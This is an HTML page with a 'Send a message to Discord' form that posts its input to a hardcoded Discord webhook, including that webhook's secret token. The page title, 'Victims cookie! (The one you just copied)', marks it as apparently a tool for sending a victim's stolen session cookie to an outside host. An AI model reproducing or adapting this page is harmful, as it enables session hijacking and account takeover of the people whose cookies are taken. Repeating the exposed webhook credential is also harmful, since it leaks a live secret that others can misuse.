<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Victims cookie! (The one you just copied)</title>
</head>
<body>
    <h1>Send a message to Discord</h1>

    <!-- Form with a text input -->
    <form id="webhookForm">
        <input type="text" id="messageInput" placeholder="Enter your message" required>
        <button type="submit">Send</button>
    </form>

    <!-- Success message -->
    <p id="successMessage" style="display:none; color:green;">Message sent successfully!</p>
    
    <!-- Error message -->
    <p id="errorMessage" style="display:none; color:red;">There was an error sending the message.</p>

    <script>
        // Your Discord webhook URL
        const webhookUrl = "https://discord.com/api/webhooks/1287147736067735697/JgfA0dprmNdMvRIyvS5F9Sy9YHFTyL44zELr-3zZ-Mhf-_Twiis-p5KOSbycTN0M01Kb";

        // Get the form and message input
        const form = document.getElementById('webhookForm');
        const messageInput = document.getElementById('messageInput');
        const successMessage = document.getElementById('successMessage');
        const errorMessage = document.getElementById('errorMessage');

        form.addEventListener('submit', function(event) {
            event.preventDefault();

            // Get the value of the input field
            const message = messageInput.value;

            // Create the payload for Discord webhook
            const payload = JSON.stringify({
                content: message
            });

            // Send the data to the Discord webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: payload,
            })
            .then(response => {
                if (response.ok) {
                    // Show success message and clear input
                    successMessage.style.display = 'block';
                    errorMessage.style.display = 'none';
                    messageInput.value = '';
                } else {
                    throw new Error('Failed to send message');
                }
            })
            .catch((error) => {
                // Show error message
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
            });
        });
    </script>
</body>
</html>
